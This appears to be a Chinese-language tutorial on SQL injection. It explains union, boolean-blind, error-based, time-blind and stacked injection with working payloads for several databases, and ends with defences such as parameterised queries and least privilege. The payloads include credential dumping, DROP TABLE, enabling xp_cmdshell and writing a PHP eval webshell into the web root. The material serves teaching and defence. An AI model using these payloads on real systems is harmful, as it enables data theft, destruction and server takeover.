---
title: SQL注入基础
description: SQL 注入漏洞的原理与危害、漏洞检测方法（可控位置/多场景/探测手法）、注入类型详解（联合查询/布尔盲注/报错注入/时间盲注/堆叠注入）、多数据库 payload 差异，以及预编译参数化等防御方案
tags: [SQL注入, Web安全, 联合查询, 盲注, 报错注入, 堆叠注入, 预编译, 防御]
status: 已完成
finish-date: 2026-09-22
difficulty: 中等
---

## 什么是SQL注入
SQL注入（SQLi）是一种Web安全漏洞，它允许攻击者干扰应用程序向其数据库发送的查询。这使得攻击者能够查看其本无权访问的数据，例如其他用户的数据，或应用程序所能访问的任何其他数据。在许多情况下，攻击者还可修改或删除这些数据，从而对应用程序的内容或行为造成持久性影响。
在某些情况下，攻击者可将SQL注入攻击升级，以危害底层服务器或其他后端基础设施，甚至可借此发动拒绝服务攻击。    

**原理：**用户输入未经过滤直接拼接到 SQL 语句中执行，攻击者通过构造恶意输入改变查询逻辑，获取数据或执行系统命令。

## SQL注入的影响
1. 泄露库信息
一次成功的SQL注入攻击可能导致未经授权访问敏感数据，例如：  
• 密码；  
• 信用卡详细信息；  
• 用户个人身份信息。
2. 绕过认证
   - 万能密码：`' or '1'='1` 
3. 执行命令获得持久性后门访问权限
   **条件：** 

    - 数据库账号有FILE权限，可以LOAD_FILe读文件、INTO OUTFILE写文件
    - 支持堆叠查询+高权限→ 可执行系统命令（MySQL UDF 提权、MSSQL xp_cmdshell、PostgreSQL COPY ... PROGRAM）
    - 数据库与应用同机、web 目录可写 → 写马直接 getshell。

4. 拒绝服务
   - SELECT BENCHMARK(100000000,SHA1('x')) 拖垮数据库。
5. 横向移动
   - 以 DB 服务器为跳板，访问内网其它主机。


## 如何检测SQL注入漏洞

1. 在查询的不同部分
凡是用户可控且进入 SQL 的位置都要测：

| 位置 | 示例 |
|------|------|
| WHERE 条件 | `?id=1` |
| ORDER BY 排序字段 | `?sort=name` |
| LIMIT 分页 | `?limit=10` |
| INSERT 的值 | 注册、评论 |
| UPDATE 的值 | 改资料 |
| 表名 / 列名 | `?table=users` |
| Cookie / Header | `User-Agent`、`X-Forwarded-For` |
| 二级注入 | 数据入库后再被查询（存储型） |

2. 在不同场景下
   
   - GET / POST / Cookie / JSON / XML / GraphQL 参数。

   - 编码差异：URL 编码、Base64、Unicode、双重编码。

   - 字符集问题：GBK 宽字节注入（%df%27）。

   - 框架特性：MyBatis ${}、ORM 的 raw()。

   - 盲注场景：无回显、无报错，只能靠布尔/时间判断。

3. 常用探测手法
```sql
'                 -- 是否报错
''                -- 是否恢复
1' AND '1'='1    -- 恒真，看页面是否正常
1' AND '1'='2    -- 恒假，看页面是否异常
1 AND SLEEP(5)   -- 时间盲注
1' UNION SELECT NULL--   -- 联合查询探测
```

**判断依据**：

- 报错信息变化 → 报错注入可能。

- 页面内容/状态码变化 → 布尔盲注。

- 响应时间变化 → 时间盲注。

## 注入类型
### 联合查询
>前提：页面有回显位，且原查询与 UNION 查询列数、类型兼容
1. 确定所需的列数
   ```
    ' ORDER BY 1-- 
    ' ORDER BY 2-- 
    ' ORDER BY 3--    ← 报错说明有 2 列
   ``` 
2. 数据库特定的闭合语法
   
    | 数据库 | 注释 | 字符串 |
    |--------|------|--------|
    | MySQL | `--`（后跟空格）、`#` | `'` `"` |
    | MSSQL | `--`、`/* */` | `'` |
    | Oracle | `--` | `'` |
    | PostgreSQL | `--`、`/* */` | `'` |   
    
    **示例：**
    ```
    ?id=1'--
    ?id=1')--
    ?id=1"))--
    ```
3. 查找具有有用数据类型的列
   把回显位换成字符串，看哪列能显示：
   ```
    ' UNION SELECT 1,'a',3-- 
   ``` 
4. 利用SQL注入联合攻击检索数据
   ```
    -- 当前库、用户、版本
    ' UNION SELECT 1,database(),user()-- 
    ' UNION SELECT 1,version(),@@datadir-- 

    -- 爆表
    ' UNION SELECT 1,group_concat(table_name),3 
    FROM information_schema.tables 
    WHERE table_schema=database()-- 

    -- 爆列
    ' UNION SELECT 1,group_concat(column_name),3 
    FROM information_schema.columns 
    WHERE table_name='users'-- 

    -- 爆数据
    ' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- 
   ``` 
5. 在单列中检索多个值
   用 group_concat()（MySQL）、string_agg()（PG）、FOR XML PATH（MSSQL）把多行拼到一列：
   ```
    ' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR '<br>'),3 FROM users-- 
   ``` 
### 布尔盲注
>页面不报错、不回显，但真/假条件导致页面内容或状态不同。

**核心 payload：**
```
' AND SUBSTRING(database(),1,1)='a'-- 
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97-- 
```
**逐字符爆破：**
```
-- 判断库名长度
' AND LENGTH(database())=5-- 

-- 逐位判断
' AND ASCII(SUBSTRING(database(),1,1))=115--   -- 's'
' AND ASCII(SUBSTRING(database(),2,1))=101--   -- 'e'
```

**自动化**： sqlmap、Burp Intruder。

**特点**： 请求量大、慢，但隐蔽。

### 报错注入
>利用数据库把查询结果"塞进报错信息"里回显。

**核心payload：**

```
SELECT 1 FROM (
    SELECT COUNT(*), CONCAT( (SELECT database()), FLOOR(RAND(0)*2) ) x
    FROM information_schema.tables
    GROUP BY x
) a
```
**逐层解释：**

- SELECT database()
取当前数据库名，比如 security。这是我们要偷的数据。
- FLOOR(RAND(0)*2)：
  - RAND(0)：以 0 为种子生成伪随机数。种子固定 → 序列固定。
  - RAND(0)*2：把 [0,1) 放大到 [0,2)。
  - FLOOR(...)：向下取整 → 结果只能是 0 或 1。

- 重点： RAND(0) 的序列是可复现的，具体是：
    ```text
    第1次: 0.155...  → *2=0.31 → floor=0
    第2次: 0.899...  → *2=1.79 → floor=1
    第3次: 0.788...  → *2=1.57 → floor=1
    第4次: 0.155...  → 又回到 0
    ...
    ```
    即 FLOOR(RAND(0)*2) 会稳定产生 0,1,1,... 这种重复序列。

- CONCAT(database(), FLOOR(RAND(0)*2))
    把库名和上面那个 0/1 拼起来：
    ```text
    security0
    security1
    security1
    security0
    ...
    ```
- GROUP BY x
    - x 是子查询的别名，代表 CONCAT(...) 那一列。GROUP BY x 会按这一列分组。

    - 问题来了： 在 MySQL 里，GROUP BY 时如果 SELECT 的列既不在 GROUP BY 里、又不是聚合函数，且值在组内不唯一，就会触发：
    ```text
    ERROR 1242 (21000): Subquery returns more than 1 row    

    或者更常见的：

    ERROR 1062 (23000): Duplicate entry 'security1' for key 'group_key'
    ```
    
    - 为什么？ 因为 CONCAT(database(), FLOOR(RAND(0)*2)) 的值在分组过程中会变化（0 变 1，1 又变 0），MySQL 认为同一组里出现了不同的"键"，于是报"重复键"错误——而错误信息里就带着 security1 这个值。

- 外层 SELECT 1 FROM (...) a
只是套一层派生表，让语法合法。真正的"内容"在错误信息里。

**优势：**

- 不依赖页面回显位（不像 UNION 需要列数匹配）。

- 不依赖布尔差异（不像布尔盲注要反复猜）。

- 直接把数据塞进数据库报错信息，一次请求拿一截数据。
  
**几个容易混淆的点**

| 疑问 | 解答 |
|------|------|
| 为什么必须 `RAND(0)` 固定种子？ | 不固定种子，序列不可复现，`GROUP BY` 不会稳定报错。 |
| 为什么能报"重复键"？ | 分组键在组内值不稳定，MySQL 判定冲突。 |
| 为什么只显示一截？ | 报错信息长度有限（约 32 字节），需配合 `SUBSTRING` 分段。 |
| MySQL 8 还能用吗？ | `group_key` 相关行为有变化，常改用 `extractvalue` / `updatexml`。 |

#### 常用函数：
- mysql
  ```
    -- extractvalue（XPath 报错，最多 32 字符）
    ' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- 

    -- updatexml
    ' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- 

    -- floor + rand + group by
    ' AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x 
    FROM information_schema.tables GROUP BY x)a)-- 

    -- exp 溢出（MySQL 5.5+）
    ' AND exp(~(SELECT * FROM (SELECT database())a))-- 
  ``` 

- MSSQL：
  ```
    ' AND 1=CONVERT(int,(SELECT @@version))-- 
  ``` 

- Oracle：
  ```
    ' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
  ``` 
### 时间盲注
>页面无回显、无报错、布尔也判断不了时，用响应时间判断真假

- MySQL：

    ```sql
    ' AND SLEEP(5)-- 
    ' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)-- 
    ' AND BENCHMARK(5000000,SHA1('x'))-- 
    ```
-MSSQL：

    ```sql
    '; WAITFOR DELAY '0:0:5'-- 
    ```
- PostgreSQL：

    ```sql
    '; SELECT pg_sleep(5)-- 
    ```
- Oracle：

    ```sql
    ' AND 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND 
    dbms_pipe.receive_message('a',5)=1)-- 
    ```
1. 利用时间延迟触发

```sql
-- 判断库名第一位是否为 's'
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115,SLEEP(3),0)-- 
```
**逐字符爆破逻辑**：

1. 二分法猜 ASCII 值。
2. 每次命中 → 延迟 3~5 秒。
3. 脚本记录耗时，还原数据。

**注意**：

- 网络抖动会造成误判，建议延迟 ≥3s、多次取样。

- 高并发下可能被 WAF 的速率限制拦住。
  
### 堆叠注入
>用 ; 分隔，一次请求执行多条 SQL。

| 数据库 / 驱动 | 是否支持 |
|---------------|----------|
| MySQL + PHP mysqli（multi_query） | ✅ |
| MySQL + PDO（默认） | ❌ |
| MSSQL | ✅ |
| PostgreSQL | ✅ |
| Oracle | ❌ |

**payload：**
```
'; DROP TABLE users-- 
'; INSERT INTO users(username,password) VALUES('hacker','123')-- 
'; UPDATE users SET password='x' WHERE username='admin'-- 
```

**MSSQL 提权：**

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- 
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
'; EXEC xp_cmdshell 'whoami'-- 
```

**MySQL 写马（需 FILE 权限 + secure_file_priv 允许）：**

```sql
' UNION SELECT "<?php @eval($_POST['x']);?>" INTO OUTFILE '/var/www/html/shell.php'-- 

```

**特点**： 危害最大，可直接改数据、写文件、执行命令。

## 如何防止SQL注入
1. 根本方案：预编译参数化查询
    - 原理：预编译把「SQL 语句结构」和「数据」彻底分离
    - **编译阶段**：数据库先解析并编译 SQL 模板（如 SELECT * FROM users WHERE id = ?），此时语句结构已固定。
    - **执行阶段**：参数值通过独立通道传入，数据库只把它当数据，永远不参与语法解析。
    - 关键误区 ⚠️
        - 表名、列名、ORDER BY 字段不能参数化。这些属于「标识符」，占位符只对「值」生效。必须用白名单映射（见第三条）。
        - PHP 中 mysqli_real_escape_string ≠ 参数化，只是转义，仍有字符集绕过风险。
        - PDO 模拟预处理（ATTR_EMULATE_PREPARES=true，默认）实际是客户端拼接，需设为 false 才真正预编译。
2. ORM 安全封装
    - MyBatis 用 #{}，禁用 ${}。
    - 避免 whereRaw() / raw() 拼接。
    - JPA/Hibernate 用命名参数。 
3. 输入白名单 + 正则校验
4. 数据库最小权限
   1. Web 账号只给 SELECT/INSERT/UPDATE/DELETE，限定库表。
   2. 禁止 FILE、PROCESS、SUPER、DROP、GRANT。
   3. 运行时账号与迁移账号分离。
5. 错误信息脱敏
6. 多层防御
    - WAF：拦已知 payload，虚拟补丁。
    - SAST：CI 阶段扫拼接代码。
    - RASP / 数据库防火墙：运行时拦截异常 SQL。
    - 代码审计 + 渗透测试：定期验证。
7.  其它
    - 统一字符集为 UTF-8，防宽字节注入。
    - 关闭不必要的数据库功能（xp_cmdshell、LOAD_FILE）。
    - 敏感数据加密存储、脱敏展示。
    - 日志监控异常 SQL 与高频请求。
